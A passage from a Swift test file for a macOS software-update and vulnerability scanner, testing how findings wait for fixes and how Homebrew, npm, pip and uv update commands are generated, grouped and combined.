        expect(krbFinding.fixed == "1.22.3" && krbFinding.expectedFix == "1.22.3" && krbFinding.reason.contains("names 1.22.3"), "expected fix carried into the finding")
        var waiting = [krbFinding]
        Scanner.markAwaiting(&waiting, newest: ["krb5": "1.22.2"])
        expect(waiting[0].awaitingFix == true && waiting[0].fixed == "1.22.3, not released yet" && Commands.commands(for: waiting[0]).isEmpty, "newest Homebrew copy with no fixed release: nothing to install")
        expect(ScanReport(findings: waiting).security.isEmpty && ScanReport(findings: waiting).awaiting.count == 1, "waiting findings don't count as needing attention")
        var shipped = [krbFinding]
        Scanner.markAwaiting(&shipped, newest: ["krb5": "1.22.3"])
        expect(shipped[0].awaitingFix == nil && shipped[0].fixed == "1.22.3" && Commands.commands(for: shipped[0]).first?.text == "brew upgrade krb5", "a newer Homebrew release makes it actionable again")
        let media = Installation(product: "ffmpeg", name: "ffmpeg", version: "9.0.2", path: "/opt/homebrew/Cellar/ffmpeg/9.0.2_1", domain: "brew", package: "ffmpeg", manager: "brew")
        var unfixed = [NVD.finding(media, product: Catalog.byID["ffmpeg"]!, hits: [NVDHit(id: "CVE-2026-107675", fixed: nil, severity: "HIGH")])!]
        Scanner.markAwaiting(&unfixed, newest: ["ffmpeg": "9.0.2"])
        expect(unfixed[0].awaitingFix == true && unfixed[0].fixed == "No fix released yet", "no fix version anywhere")
        var listedFix = [NVD.finding(media, product: Catalog.byID["ffmpeg"]!, hits: [NVDHit(id: "CVE-2026-9", fixed: "9.0.3", severity: "HIGH")])!]
        Scanner.markAwaiting(&listedFix, newest: ["ffmpeg": "9.0.2"])
        expect(listedFix[0].awaitingFix == true && listedFix[0].fixed == "9.0.3, not in Homebrew yet" && Commands.commands(for: listedFix[0]).isEmpty, "a fix Homebrew hasn't shipped waits, with no command that would only say it's already installed")
        var listedShipped = [NVD.finding(media, product: Catalog.byID["ffmpeg"]!, hits: [NVDHit(id: "CVE-2026-9", fixed: "9.0.3", severity: "HIGH")])!]
        Scanner.markAwaiting(&listedShipped, newest: ["ffmpeg": "9.0.3"])
        expect(listedShipped[0].awaitingFix == nil && Commands.commands(for: listedShipped[0]).first?.text == "brew upgrade ffmpeg", "once Homebrew ships the fixed release, the command is back")
        // OpenSSL's own page names 3.5.10 as the fix while Homebrew's newest openssl@3 is still 3.5.9.
        let openssl3 = Installation(product: "openssl", name: "openssl@3", version: "3.5.9", path: "/opt/homebrew/Cellar/openssl@3/3.5.9", domain: "brew", package: "openssl@3", manager: "brew")
        var vendorFix = [Finding(source: "openssl", installation: openssl3, kind: .security, fixed: "3.5.10", reason: "5 published fixes match this OpenSSL version.", action: "Upgrade", links: [])]
        Scanner.markAwaiting(&vendorFix, newest: ["openssl@3": "3.5.9"])
        expect(vendorFix[0].awaitingFix == true && vendorFix[0].fixed == "3.5.10, not in Homebrew yet" && vendorFix[0].action.contains("Homebrew hasn't shipped") && Commands.commands(for: vendorFix[0]).isEmpty, "a vendor's fix that Homebrew hasn't shipped waits too, whatever the finding's source")
        expect(ScanReport(findings: vendorFix).security.isEmpty && ScanReport(findings: vendorFix).awaiting.count == 1, "and it doesn't count as needing attention")
        var vendorOlder = [Finding(source: "openssl", installation: openssl3, kind: .security, fixed: "3.5.10", reason: "", action: "Upgrade", links: [])]
        Scanner.markAwaiting(&vendorOlder, newest: ["openssl@3": "3.5.10"])
        expect(vendorOlder[0].awaitingFix == nil && vendorOlder[0].fixed == "3.5.10", "with the fixed release in Homebrew it stays an ordinary finding")
        let vscodeCopy = Installation(product: "vscode", name: "Visual Studio Code", version: "1.90", path: "/Applications/Visual Studio Code.app", domain: "apps", package: "visual-studio-code", manager: "app")
        var appFinding = [NVD.finding(vscodeCopy, product: Catalog.byID["vscode"]!, hits: [NVDHit(id: "CVE-2026-8", fixed: nil, severity: "LOW")])!]
        Scanner.markAwaiting(&appFinding, newest: ["visual-studio-code": "1.90"])
        expect(appFinding[0].awaitingFix == nil, "only Homebrew formulae are compared with Homebrew's newest release")
        var homebrewDown = [krbFinding], neverWaited = [krbFinding], upgradedSince = [krbFinding]
        Scanner.markAwaiting(&homebrewDown, newest: [:], waiting: [waiting[0].id: waiting[0]])
        Scanner.markAwaiting(&neverWaited, newest: [:])
        let olderCopy = Finding(source: waiting[0].source, installation: Installation(product: "krb5", name: "krb5", version: "1.22.1", path: krb5.path, domain: "brew", package: "krb5", manager: "brew"),
                                kind: .security, fixed: waiting[0].fixed, reason: "", action: waiting[0].action, links: [])
        Scanner.markAwaiting(&upgradedSince, newest: [:], waiting: [olderCopy.id: olderCopy])
        expect(homebrewDown[0].awaitingFix == true && homebrewDown[0].fixed == "1.22.3, not released yet" && neverWaited[0].awaitingFix == nil && upgradedSince[0].awaitingFix == nil,
               "without Homebrew's data, only a finding that was waiting on the same version keeps waiting")

        // Homebrew rebuilds and old copies.
        expect(homebrewOlder("26.12.1", "26.12.1_1") && homebrewOlder("26.11.0_3", "26.12.1") && !homebrewOlder("26.12.1_1", "26.12.1_1")
               && !homebrewOlder("26.12.1_2", "26.12.1_1") && !homebrewOlder("26.12.1", "26.12.1"), "Homebrew rebuild numbers order builds of one version")
        let oldNode = Installation(product: "node", name: "node", version: "25.8.0", path: "/opt/homebrew/Cellar/node/25.8.0", domain: "brew", package: "node", manager: "brew-old")
        expect(Commands.commands(for: Finding(source: "inventory-brew", installation: oldNode, kind: .update, fixed: "Remove older copy", reason: "", action: "", links: [])).map(\.text)
               == ["brew upgrade node && brew cleanup node", "rm -rf /opt/homebrew/Cellar/node/25.8.0"], "old copies: upgrade so cleanup runs, or remove just this copy")
        var pinnedOld = oldNode; pinnedOld.pinned = true
        expect(Commands.commands(for: Finding(source: "inventory-brew", installation: pinnedOld, kind: .update, fixed: "Remove older copy", reason: "", action: "", links: [])).map(\.text)
               == ["rm -rf /opt/homebrew/Cellar/node/25.8.0"], "a pinned formula's old copy is removed without upgrading")
        let oddPath = Installation(product: "node", name: "node", version: "25.8.0", path: "/tmp/node/25.8.0", domain: "brew", package: "node", manager: "brew-old")
        expect(Commands.commands(for: Finding(source: "inventory-brew", installation: oddPath, kind: .update, fixed: "Remove older copy", reason: "", action: "", links: [])).map(\.text)
               == ["brew upgrade node && brew cleanup node"], "rm is offered only for a copy inside Homebrew's Cellar")
        var pinnedCurl = Installation(product: "curl", name: "curl", version: "8.5.0", path: "/opt/homebrew/Cellar/curl/8.5.0", domain: "brew", package: "curl", manager: "brew"); pinnedCurl.pinned = true
        expect(commandFor(pinnedCurl) == "brew unpin curl && brew upgrade curl", "pinned formulae are unpinned before upgrading")

        // Findings that share a recommended command become one group, in list order.
        func listed(_ name: String, _ path: String, _ options: [UpdateCommand]?) -> Finding {
            var finding = Finding(source: "test", installation: Installation(product: name, name: name, version: "1.0", path: path, domain: "brew"), kind: .security, fixed: "2.0", reason: "", action: "", links: [])
            finding.commands = options
            return finding
        }
        let shared = [UpdateCommand(text: "brew upgrade node && brew cleanup node", note: "")]
        let groups = groupByCommand([listed("node", "/a", shared), listed("curl", "/b", [UpdateCommand(text: "brew upgrade curl", note: "")]), listed("node", "/c", shared),
                                     listed("app", "/d", [UpdateCommand(text: "Open App", note: "", kind: "app", target: "/d")]), listed("app", "/e", [UpdateCommand(text: "Open App", note: "", kind: "app", target: "/d")]),
                                     listed("none", "/f", nil), listed("node", "/g", shared)])
        expect(groups.map { $0.findings.map(\.installation.path) } == [["/a", "/c", "/g"], ["/b"], ["/d"], ["/e"], ["/f"]] && groups[0].command?.text == shared[0].text && groups[1].command == nil,
               "shared Terminal commands group in list order; apps, links and findings without commands stay separate")

        // Commands that share a template combine into one line for the All commands panel.
        func first(_ item: Installation, fixed: String = "2.0.0", malicious: Bool = false) -> UpdateCommand {
            var finding = Finding(source: "osv", installation: item, kind: .security, fixed: fixed, reason: "", action: "", links: [])
            if malicious { finding.malicious = true }
            return Commands.commands(for: finding).first!
        }
        func brew(_ name: String, _ manager: String = "brew", pinned: Bool = false) -> Installation {
            var item = Installation(product: name, name: name, version: "1.0", path: "/opt/homebrew/Cellar/\(name)/1.0", domain: "brew", package: name, manager: manager)
            if pinned { item.pinned = true }
            return item
        }
        func npx(_ dir: String) -> Installation { Installation(product: "npm:x", name: "x", version: "1.0.0", path: dir + "/node_modules/x", domain: "packages", ecosystem: "npm", packageName: "x", manager: "npx-cache", location: dir) }
        func pipPackage(_ name: String) -> Installation { Installation(product: "pypi:" + name, name: name, version: "1.0", path: "/s/" + name, domain: "packages", ecosystem: "PyPI", packageName: name, manager: "pip-brew", location: "/opt/homebrew/bin/python3.14") }
        func npmProject(_ name: String, _ role: String) -> Installation { Installation(product: "npm:" + name, name: name, version: "1.0.0", path: "/p/package-lock.json#" + name, domain: "projects", ecosystem: "npm", packageName: name, manager: "npm", location: "/p", dependency: role) }
        let combinedLines = Commands.combined([first(brew("curl")), first(brew("node", "brew-old")), first(brew("git")), first(brew("simdutf", "brew-old")), first(brew("curl")),
                                               first(npx("/Users/a/.npm/_npx/one two")), first(npx("/Users/a/.npm/_npx/three")),
                                               first(pipPackage("certifi")), first(pipPackage("pip")),
                                               first(brew("jq", pinned: true)), first(brew("yq", pinned: true)),
                                               first(npmProject("vite", "dev")), first(npmProject("next", "direct")), first(npmProject("vitest", "dev")),
                                               first(npmProject("qs", "transitive")), first(npmProject("ms", "transitive")),
                                               UpdateCommand(text: "Open Software Update", note: "", kind: "link", target: "x-apple.systempreferences:x")])
        expect(combinedLines == ["brew upgrade curl git", "brew upgrade node simdutf && brew cleanup node simdutf", "rm -rf '/Users/a/.npm/_npx/one two' /Users/a/.npm/_npx/three",
                                 "/opt/homebrew/bin/python3.14 -m pip install --upgrade certifi==2.0.0 pip==2.0.0 --break-system-packages", "brew unpin jq yq && brew upgrade jq yq",
                                 "cd /p && npm install vite@2.0.0 vitest@2.0.0 --save-dev", "cd /p && npm install next@2.0.0", "cd /p && npm audit fix"],
               "combined commands: shared templates join their arguments, repeats collapse, links are left out")
        let otherProject = Installation(product: "npm:a", name: "a", version: "1.0.0", path: "/q/package-lock.json#a", domain: "projects", ecosystem: "npm", packageName: "a", manager: "npm", location: "/q", dependency: "transitive")
        expect(Commands.combined([first(npmProject("qs", "transitive")), first(otherProject), first(npmProject("next", "direct"))]) == ["cd /p && npm audit fix", "cd /p && npm install next@2.0.0", "cd /q && npm audit fix"],
               "each project's commands stay together")
        func withCommands(_ item: Installation) -> Finding {
            var finding = Finding(source: "test", installation: item, kind: .update, fixed: "2.0", reason: "", action: "", links: [])
            finding.commands = Commands.commands(for: finding)
            return finding
        }
        let shapes = groupByCommand([withCommands(brew("ada-url", "brew-old")), withCommands(brew("curl")), withCommands(brew("brotli", "brew-old")), withCommands(brew("git"))])
        expect(shapes.count == 2 && shapes[0].command?.text == "brew upgrade ada-url brotli && brew cleanup ada-url brotli" && shapes[1].command?.text == "brew upgrade curl git",
               "cards group by command template: older copies of different formulae share one card")
        let cardReport = Feedback.summary(of: shapes[1].findings, command: shapes[1].command)
        expect(Feedback.title(for: shapes[1].findings, named: "Homebrew formulae", problem: .fixFailed) == "Homebrew formulae, 2 updates: the fix didn't work"
               && Feedback.title(for: shapes[1].findings, named: "Homebrew formulae", problem: .other) == "Homebrew formulae, 2 updates: problem with these findings"
               && Feedback.title(for: [shapes[1].findings[0]], named: "Homebrew formulae", problem: .fixFailed) == Feedback.title(for: shapes[1].findings[0], problem: .fixFailed),
               "a card's report is titled with its name and count; one finding keeps its own title")
        expect(cardReport.hasPrefix("- **Shown for all 2:** `brew upgrade curl git`\n\n- **Finding:** curl ") && cardReport.contains("\n\n- **Finding:** git ")
               && !cardReport.contains("**Shown:**") && Feedback.summary(of: shapes[1].findings, command: nil).components(separatedBy: "**Shown:**").count == 3,
               "a card's report gives the shared command once, then each finding; without one, each finding keeps its own")

        // What a running check shows.
        var live = CheckProgress()
        expect(live.tally == "Step 1 of 10 · No findings so far" && live.steps.allSatisfy { $0.state == .waiting }, "a check starts with its whole route still to come")
        live.start("inventory")
        live.finish("237 installations")
        live.skip("actions")
        live.start("vendors")
        live.findings = 1
        expect(live.steps.map(\.state).prefix(3) == [.finished, .running, .waiting] && live.steps[0].result == "237 installations" && live.steps.count == 9 && live.tally == "Step 2 of 9 · 1 finding so far",
               "steps finish in order with what they found, and one that doesn't apply leaves the route")
        live.finish("1 couldn't be read; see Coverage", failed: true)
        live.findings = 8
        expect(live.steps[1].state == .failed && live.running == nil && live.tally == "Step 2 of 9 · 8 findings so far", "a failed step counts as finished and stays marked")
        expect(CheckProgress.nvdNote(requests: 0) == "Using NVD's answers saved by a check in the last 20 hours."
               && CheckProgress.nvdNote(requests: 3).hasSuffix("Less than a minute left in this step.")
               && CheckProgress.nvdNote(requests: 8).hasSuffix("About 1 minute left in this step.")
               && CheckProgress.nvdNote(requests: 32).hasSuffix("About 4 minutes left in this step."), "NVD's wait is told from the requests still to make")

        // What holds a flagged package back in the npx cache.
        func allows(_ range: String, _ version: String, _ expected: Bool?) -> Bool { NpxCache.allows(range, version) == expected }
        expect(allows("2.0.0", "2.3.0", false) && allows("=2.0.0", "2.0.0", true) && allows("^1.19.9", "2.1.3", false) && allows("^1.19.9", "1.20.0", true)
               && allows("^0.3.1", "0.3.9", true) && allows("^0.3.1", "0.4.0", false) && allows("^0.0.3", "0.0.4", false) && allows("^0", "0.9.0", true) && allows("^0.0", "0.1.0", false),
               "npm's exact and caret ranges")
        expect(allows("~1.2.3", "1.2.9", true) && allows("~1.2.3", "1.3.0", false) && allows("~1", "1.9.0", true) && allows("1.x", "1.9.0", true) && allows("1.x", "2.0.0", false) && allows("1.2", "1.2.7", true)
               && allows("*", "9.0.0", true) && allows("", "9.0.0", true) && allows(">=1.0.0 <2.0.0", "1.5.0", true) && allows(">=1.0.0 <2.0.0", "2.0.0", false) && allows("^1.0.0 || ^2.0.0", "2.1.3", true),
               "npm's tilde, x, comparison and alternative ranges")
        expect(allows("latest", "2.0.0", nil) && allows("^2.0.0-beta.1", "2.1.0", nil) && allows("^2.0.0", "2.1.0-rc.1", nil) && allows("1.0.0 - 2.0.0", "1.5.0", nil), "tags, prereleases and hyphen ranges are unknown")
        let lockPackages: [String: [String: Any]] = [
            "": ["dependencies": ["tool": "^2.0.4"]],
            "node_modules/tool": ["version": "2.0.4", "dependencies": ["sdk": "2.0.0", "http": "2.0.0", "loose": "^1.0.0", "free": "^2.0.0"]],
            "node_modules/sdk": ["version": "2.0.0"], "node_modules/free": ["version": "2.0.0"],
            "node_modules/http": ["version": "2.0.0", "dependencies": ["server": "^1.19.9", "sdk": "^2.0.0"]], "node_modules/server": ["version": "1.19.17"],
            "node_modules/loose": ["version": "1.2.0", "dependencies": ["old": "^1.0.0"]], "node_modules/old": ["version": "1.0.0"]]
        let lock: [String: Any] = ["packages": lockPackages]
        let pin = NpxCache.hold("sdk", fix: "2.3.0", tools: ["tool"], lock: lock), through = NpxCache.hold("server", fix: "2.1.3", tools: ["tool"], lock: lock)
        expect(pin == NpxCache.Hold(package: "sdk", tool: "tool", version: "2.0.4", dependency: "sdk", range: "2.0.0", holder: "tool", holderVersion: "2.0.4", allows: "2.0.0"), "a version the tool pins is held by the tool")
        expect(through == NpxCache.Hold(package: "server", tool: "tool", version: "2.0.4", dependency: "http", range: "2.0.0", holder: "http", holderVersion: "2.0.0", allows: "^1.19.9"),
               "a range that rules out the fix holds when the tool pins the package asking for it")
        expect(NpxCache.hold("free", fix: "2.1.0", tools: ["tool"], lock: lock) == nil, "a range that allows the fix is no hold")
        expect(NpxCache.hold("old", fix: "2.0.0", tools: ["tool"], lock: lock) == nil, "a package the tool doesn't pin could resolve differently, so its range is no hold")
        expect(NpxCache.hold("sdk", fix: "No fixed version published", tools: ["tool"], lock: lock) == nil && NpxCache.hold("sdk", fix: "2.3.0", tools: [], lock: lock) == nil, "no fixed version or no tool, no hold")
        let cacheFolder = FileManager.default.temporaryDirectory.appendingPathComponent(UUID().uuidString).path
        try FileManager.default.createDirectory(atPath: cacheFolder, withIntermediateDirectories: true)
        defer { try? FileManager.default.removeItem(atPath: cacheFolder) }
        try JSONSerialization.data(withJSONObject: ["dependencies": ["tool": "^2.0.4"], "_npx": ["packages": ["tool"]]]).write(to: URL(fileURLWithPath: cacheFolder + "/package.json"))
        try JSONSerialization.data(withJSONObject: lock).write(to: URL(fileURLWithPath: cacheFolder + "/package-lock.json"))
        expect(NpxCache.tools(in: cacheFolder) == ["tool"] && Inventory.npxLabel(cacheFolder) == "the npx cache, for tool" && Inventory.npxLabel(cacheFolder + "/missing") == "the npx cache", "the card names the tool npx ran")
        func cached(_ name: String, _ version: String, fixed: String, malicious: Bool? = nil) -> Finding {
            Finding(source: "osv", installation: Installation(product: "npm:" + name, name: name, version: version, path: cacheFolder + "/node_modules/" + name, domain: "packages", ecosystem: "npm", packageName: name, manager: "npx-cache", location: cacheFolder),
                    kind: .security, fixed: fixed, reason: "", action: "Delete it.", links: [], malicious: malicious)
        }
        var heldFindings = [cached("sdk", "2.0.0", fixed: "2.3.0"), cached("server", "1.19.17", fixed: "2.1.3"), cached("free", "2.0.0", fixed: "2.1.0")]
        let cacheHolds = NpxCache.holds(in: heldFindings + [cached("old", "1.0.0", fixed: "Remove this version", malicious: true)])
        expect(cacheHolds.count == 2 && cacheHolds[heldFindings[0].id] == pin && cacheHolds[heldFindings[1].id] == through, "holds are read from the cached install, and malicious packages have none")
        NpxCache.mark(&heldFindings, holds: cacheHolds, newest: ["tool": NpxCache.Release(version: "2.0.4", dependencies: [:])])
        expect(heldFindings[0].awaitingFix == true && heldFindings[0].heldBack?.tool == "tool" && heldFindings[1].awaitingFix == true && heldFindings[2].awaitingFix == nil
               && heldFindings[0].action == "tool 2.0.4 requires sdk 2.0.0, which rules out the fix. tool 2.0.4 is its newest release, so deleting the npx cache would only bring this back. Shipshape alerts you when a release allows the fix."
               && heldFindings[1].heldBack?.requirement == "http 2.0.0, pinned by tool 2.0.4, requires server ^1.19.9", "on the tool's newest release a held package waits for a fix, and says why")
        expect(Commands.commands(for: heldFindings[0]).isEmpty && !Commands.commands(for: heldFindings[2]).isEmpty && FindingCategory(of: heldFindings[0]) == .waiting, "a held package offers no command and doesn't need attention")
        let heldCards = groupByCommand(Array(heldFindings.prefix(2)))
        expect(heldCards.count == 1 && heldCards[0].command == nil, "what one tool holds back shares a card, with no command")
        expect(Feedback.summary(of: heldFindings[0]).contains("waiting on tool"), "a report says what the finding is waiting on")
        func marked(_ release: NpxCache.Release?, waiting: [String: Finding] = [:]) -> Finding {
            var findings = [cached("sdk", "2.0.0", fixed: "2.3.0")]
            NpxCache.mark(&findings, holds: [findings[0].id: pin!], newest: release.map { ["tool": $0] } ?? [:], waiting: waiting)
            return findings[0]
        }
        let samePin = marked(NpxCache.Release(version: "2.0.5", dependencies: ["sdk": "2.0.0"]))
        expect(samePin.awaitingFix == true && samePin.heldBack?.outlook.hasPrefix("tool's newest release, 2.0.5, asks for the same") == true, "a newer release that pins the same version still waits")
        expect(marked(NpxCache.Release(version: "2.0.5", dependencies: ["sdk": "^2.3.0"])).awaitingFix == nil, "a newer release that asks for something else may take the fix, so the command stays")
        expect(marked(nil).awaitingFix == nil, "without npm's answer a package that wasn't waiting stays an ordinary finding")
        let carried = marked(nil, waiting: [heldFindings[0].id: heldFindings[0]])
        expect(carried.awaitingFix == true && carried.heldBack == heldFindings[0].heldBack && carried.action == heldFindings[0].action, "without npm's answer one that was waiting keeps waiting")
        expect(Alerts.pruned([heldFindings[0].id: "x"], report: { var r = ScanReport(); r.findings = heldFindings; return r }()).isEmpty, "a held package loses its alert record, so it alerts when a release allows the fix")

        // Versions with text around the number, and a final guard against "updates" to the installed release.
        expect(!looseLess("Build 4215", "4215") && !looseLess("4215", "Build 4215") && looseLess("Build 4215", "4216") && looseLess("r3222", "r3223") && looseLess("v1.2", "1.2.1"),
               "the first number anywhere in the text is the version")
        expect(sameRelease("Build 4215", "4215") && sameRelease("1.2", "1.2.0") && !sameRelease("15.0.0", "15.0.0_1") && !sameRelease("4.0.0", "Remove older copy") && !sameRelease("1.0", "1.1"),
               "same release written differently; rebuilds and text-only targets are not the same release")
        func update(_ item: Installation, _ fixed: String, kind: FindingKind = .update) -> Finding { Finding(source: "test", installation: item, kind: kind, fixed: fixed, reason: "", action: "", links: []) }
        let sublime = Installation(product: "sublime-text", name: "Sublime Text", version: "Build 4215", path: "/Applications/Sublime Text.app", domain: "apps", package: "sublime-text", manager: "app")
        let harfbuzz = Installation(product: "harfbuzz", name: "harfbuzz", version: "15.0.0", path: "/opt/homebrew/Cellar/harfbuzz/15.0.0", domain: "brew", package: "harfbuzz", manager: "brew")
        let rebuilt = Installation(product: "node", name: "node", version: "26.12.1", path: "/opt/homebrew/Cellar/node/26.12.1_1", domain: "brew", package: "node", manager: "brew")
        var candidates = [update(sublime, "4215"), update(sublime, "4216"), update(harfbuzz, "15.0.0_1"), update(rebuilt, "26.12.1_1"), update(oldNode, "Remove older copy"), update(sublime, "4215", kind: .security)]
        let dropped = Scanner.dropSameReleaseUpdates(&candidates)
        expect(dropped == 2 && candidates.map(\.fixed) == ["4216", "15.0.0_1", "Remove older copy", "4215"],
               "same-release updates are dropped (including an installed rebuild); real updates, rebuilds, removals and security findings stay")

        // Python branches: NVD lists CVE-2026-7210 only as "before 3.13.14", while the others name a fix in each branch.
        let python = Catalog.byID["python"]!
        func uvPython(_ version: String) -> Installation {
            Installation(product: "python", name: "Python (uv)", version: version, path: "/u/cpython-\(version)-macos-aarch64-none", domain: "tools", manager: "uv-python")
        }
        let py310 = NVD.finding(uvPython("3.10.20"), product: python, hits: [NVDHit(id: "CVE-2026-0864", fixed: "3.10.21", severity: "MEDIUM"),
                                                                         NVDHit(id: "CVE-2026-7210", fixed: "3.13.14", severity: "HIGH"), NVDHit(id: "CVE-2023-36632", fixed: nil, severity: "HIGH")])!
        expect(py310.fixed == "3.10.21" && py310.reason.hasPrefix("3 NVD-listed vulnerabilities affect this version; 1 list no fixed version; 1 lists a fix only in a newer Python (3.13.14)."),
               "a Python fix stays in the installed branch, and a fix listed only in a newer branch is mentioned")
        let onlyNewer = NVD.finding(uvPython("3.12.13"), product: python, hits: [NVDHit(id: "CVE-2026-7210", fixed: "3.13.14", severity: "HIGH")])!
        let curlHits = NVD.finding(Installation(product: "curl", name: "curl", version: "8.10.1", path: "/c", domain: "brew", manager: "brew"), product: Catalog.byID["curl"]!,
                                   hits: [NVDHit(id: "CVE-1", fixed: "8.10.2", severity: "LOW"), NVDHit(id: "CVE-2", fixed: "8.11.0", severity: "LOW")])!
        expect(onlyNewer.fixed == "3.13.14" && !onlyNewer.reason.contains("newer") && curlHits.fixed == "8.11.0",
               "a newer branch is the fix only when the installed branch has none listed; products without branches take the highest fix")
        let uvFindings = [py310, update(uvPython("3.12.13"), "3.12.14", kind: .security), update(uvPython("3.13.14"), "3.13.15", kind: .security)].map { finding -> Finding in
            var finding = finding; finding.commands = Commands.commands(for: finding); return finding
        }
        let uvGroups = groupByCommand(uvFindings)
        expect(uvFindings[0].commands?.first?.text == "uv python upgrade 3.10" && uvGroups.count == 1 && uvGroups[0].command?.text == "uv python upgrade 3.10 3.12 3.13"
               && Commands.commands(for: onlyNewer).first?.text == "uv python install 3.13", "uv upgrades each Python within its branch, in one command; a fix only in a newer branch installs that branch")
        expect(onlyNewer.action.hasPrefix("No Python 3.12 release has every fix") && py310.action.hasPrefix("Install the update"), "a card says when only a newer branch has the fix")

        // Issue #4: the newer branch was already installed, so uv said so and the findings stayed.
        var uvContext = CommandContext.all
        let onlyNewer310 = NVD.finding(uvPython("3.10.22"), product: python, hits: [NVDHit(id: "CVE-2026-6019", fixed: "3.13.14", severity: "LOW")])!
        func uvCommand(_ finding: Finding, _ pythons: [String: Bool]) -> String? {
            uvContext.uvPythons = pythons
            return Commands.commands(for: finding, context: uvContext).first?.text
        }
        let replaced = [onlyNewer310, onlyNewer].map { finding -> Finding in
            var finding = finding; uvContext.uvPythons = ["3.10.22": false, "3.12.13": false, "3.13.18": true]; finding.commands = Commands.commands(for: finding, context: uvContext); return finding
        }
        expect(groupByCommand(replaced).count == 1 && groupByCommand(replaced)[0].command?.text == "uv python uninstall 3.10 3.12" && replaced[0].commands?.first?.note.contains("Python 3.13.18 is already installed") == true,
               "with a fixed Python already installed, what's left is removing the older ones, in one command")
        expect(uvCommand(onlyNewer, ["3.14.10": true]) == "uv python uninstall 3.12" && uvCommand(onlyNewer, ["3.13.18": false]) == "uv python uninstall 3.12",
               "a later branch with no findings counts as a replacement, and so does the fix's own branch, whose findings are about other advisories")
        expect(uvCommand(onlyNewer, ["3.13.12": false]) == "uv python upgrade 3.13", "a target branch behind the fix is upgraded, because uv python install would do nothing")
        expect(uvCommand(onlyNewer, ["3.14.2": false]) == "uv python install 3.13" && uvCommand(onlyNewer, ["3.12.13": false]) == "uv python install 3.13",
               "with no fixed Python here, the target branch is installed; a later branch numbered past the fix can still lack it")

        // Issue #4: NVD's single range for every branch, against the affected releases OSV works out from the fix commits.
        let everyBranch = NVDHit(id: "CVE-2026-7210", fixed: "3.13.14", severity: "MEDIUM", expected: nil, published: nil), unbounded = NVDHit(id: "CVE-2026-3087", fixed: nil, severity: "MEDIUM")
        let osvReleases = ["v3.10.21", "v3.12.13", "v3.12.12", "v3.12.0", "v3.12.0rc1", "v3.13.13", "v3.14.5", "v3.15.0b1"]
        expect(NVD.inBranch(everyBranch, version: "3.12.16", affected: osvReleases) == nil && NVD.inBranch(everyBranch, version: "3.10.22", affected: osvReleases) == nil, "a release past the affected ones in its branch has the fix, whatever NVD's range says")
        expect(NVD.inBranch(everyBranch, version: "3.12.13", affected: osvReleases)?.fixed == "3.12.14" && NVD.inBranch(everyBranch, version: "3.12.5", affected: osvReleases)?.fixed == "3.12.14"
               && NVD.inBranch(unbounded, version: "3.12.13", affected: osvReleases)?.fixed == "3.12.14", "an affected release takes its own branch's fix instead of a newer branch's")
        expect(NVD.inBranch(everyBranch, version: "3.11.18", affected: osvReleases)?.fixed == "3.13.14" && NVD.inBranch(everyBranch, version: "3.12.16", affected: ["v3.12.0rc1", "v3.13.13"])?.fixed == "3.13.14"
               && NVD.inBranch(everyBranch, version: "3.12.16", affected: [])?.fixed == "3.13.14", "with no final release of the branch listed, OSV says nothing about it and the hit stands")
        let inOwnBranch = NVDHit(id: "CVE-1", fixed: "3.12.15", severity: "LOW")
        expect(NVD.inBranch(inOwnBranch, version: "3.12.13", affected: osvReleases)?.fixed == "3.12.15", "a fix NVD lists in the branch is kept")

        // python@3.12 can't reach a fix that's only in Python 3.13, so there's nothing to run.
        var brewPython = NVD.finding(Installation(product: "python", name: "python@3.12", version: "3.12.16", path: "/opt/homebrew/Cellar/python@3.12/3.12.16", domain: "brew", package: "python@3.12", manager: "brew"), product: python,
                                     hits: [NVDHit(id: "CVE-2026-6019", fixed: "3.13.14", severity: "LOW")])!
        var brewFindings = [brewPython]
        Scanner.markAwaiting(&brewFindings, newest: ["python@3.12": "3.12.16"])
        brewPython = brewFindings[0]
        expect(brewPython.awaitingFix == true && brewPython.fixed == "No 3.12 fix yet" && brewPython.action.contains("no 3.12 release fixes these yet; newer branches do") && Commands.commands(for: brewPython).isEmpty,
               "a Homebrew Python on its newest release waits when only a newer branch has the fix")
        brewFindings = [NVD.finding(brewFindings[0].installation, product: python, hits: [NVDHit(id: "CVE-2026-6019", fixed: "3.13.14", severity: "LOW")])!]
        Scanner.markAwaiting(&brewFindings, newest: ["python@3.12": "3.12.17"])
        expect(brewFindings[0].awaitingFix != true, "a Homebrew Python behind its formula still gets the upgrade")

        // uv keeps the old patch release after an upgrade; only the newest of each branch and platform is checked.
        let uvRoot = FileManager.default.temporaryDirectory.appendingPathComponent("shipshape-uv-\(UUID().uuidString)").path
        for folder in ["cpython-3.10.20-macos-aarch64-none/lib/python3.10/site-packages/setuptools-82.0.1.dist-info", "cpython-3.13.14-macos-aarch64-none/lib/python3.13/site-packages/pip-24.0.dist-info",
                       "cpython-3.13.18-macos-aarch64-none/lib/python3.13/site-packages", "cpython-3.13.14-macos-x86_64-none", "cpython-3.12.13-macos-aarch64-none"] {
            try FileManager.default.createDirectory(atPath: uvRoot + "/" + folder, withIntermediateDirectories: true)
        }
        try Data("Metadata-Version: 2.1\nName: setuptools\nVersion: 82.0.1\n".utf8).write(to: URL(fileURLWithPath: uvRoot + "/cpython-3.10.20-macos-aarch64-none/lib/python3.10/site-packages/setuptools-82.0.1.dist-info/METADATA"))
        try Data("Metadata-Version: 2.1\nName: pip\nVersion: 24.0\n".utf8).write(to: URL(fileURLWithPath: uvRoot + "/cpython-3.13.14-macos-aarch64-none/lib/python3.13/site-packages/pip-24.0.dist-info/METADATA"))
        try Data("[externally-managed]\n".utf8).write(to: URL(fileURLWithPath: uvRoot + "/cpython-3.10.20-macos-aarch64-none/lib/python3.10/EXTERNALLY-MANAGED"))
        try FileManager.default.createSymbolicLink(atPath: uvRoot + "/cpython-3.13-macos-aarch64-none", withDestinationPath: uvRoot + "/cpython-3.13.18-macos-aarch64-none")
        let uvItems = Inventory.managedPythons(root: uvRoot, manager: "uv-python")
        expect(uvItems.map { "\($0.name) \($0.version) \($0.manager!)\($0.path.contains("x86_64") ? " x86_64" : "")" }.sorted()
               == ["Python (uv) 3.10.20 uv-python", "Python (uv) 3.12.13 uv-python", "Python (uv) 3.13.14 uv-python x86_64", "Python (uv) 3.13.14 uv-python-old", "Python (uv) 3.13.18 uv-python", "setuptools 82.0.1 pip-uv"],
               "older patch releases are old copies, the minor-version link is skipped, and an older copy's packages aren't checked")
        let oldPatch = uvItems.first { $0.manager == "uv-python-old" }!, uvSetuptools = uvItems.first { $0.name == "setuptools" }!
